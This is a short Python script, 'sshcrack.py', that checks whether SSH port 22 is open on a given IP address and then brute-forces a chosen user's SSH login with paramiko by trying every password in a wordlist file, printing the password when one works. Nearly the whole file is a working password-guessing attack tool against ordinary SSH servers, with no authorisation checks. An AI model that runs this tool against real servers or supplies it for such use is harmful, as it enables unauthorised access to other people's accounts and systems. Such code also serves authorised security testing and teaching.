#!/usr/bin/env python
"""sshcrack.py"""
# This script is developed in Windows environment.
# Some testing done in Linux environment, seems to work ok.
# Author: Ari Ketola
import sys
import os
import socket
import argparse
import paramiko
import scan

PASSWORD = "pw.txt"                     # Default password file
PORT = 22                               # SSH port 22

def ssh_check(ip):
    """Check if port 22 is open"""
    port = PORT
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((ip,port))
    sock.close()
    if result == 0:    #Port open
        return True
    print(f"Port {PORT} is closed for {ip}. No scan performed.")
    return False


def ssh_connect(target_ip, username, password, code=0):
    """Connet to SSH server"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target_ip, PORT, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code


def ssh_crack(password_file, username, target_ip):
    """Try to crack password for user on SSH server"""
    print(f"SSH cracker started for user '{username}' on server '{target_ip}'.")
    try:
        with open(password_file, 'r', encoding='utf-8') as file:
            for line in file:
                password = line.strip()
                try:
                    response = ssh_connect(target_ip, username, password)

                    if response == 0:
                        print(f"Password found: '\033[96m{password}\033[0m'")
                        sys.exit(0)
                    elif response == 1:
                        print(f"Wrong password:'{password}'")
                except Exception as e:
                    print(e)
    except FileNotFoundError:
        print("Password file not found. Please check the file path.")
        sys.exit(1)
    print(f"No matching password found for '{username}' on server '{target_ip}'.")


def main_sshcracker():
    """Main ssh crack function to handle commandline arguments"""
    parser = argparse.ArgumentParser(description="Crack a ssh login password.")

    # Define arguments for encrypting and decrypting
    parser.add_argument(
        'user',
        help="The username you wish to crack"
    )
    parser.add_argument(
        'ip',
        help="The IP address to the ssh server."
    )
    parser.add_argument(
        'file',
        default=PASSWORD,
        nargs='?',
        help=f"The path to the .txt file with passwords (default file '{PASSWORD}'). "
    )
    # Parse the arguments
    args = parser.parse_args()

    if not os.path.exists(args.file):
        print(f"{os.path.basename(__file__)}: error: file '{args.file}' doesn't exist")
    elif not scan.ip_address_validator(args.ip):
        print(f"File {os.path.basename(__file__)}: error: IP '{args.ip}' doesn't exist")
    else:
        if ssh_check(args.ip):
            ssh_crack(args.file, args.user, args.ip)


if __name__ == "__main__":
    main_sshcracker()
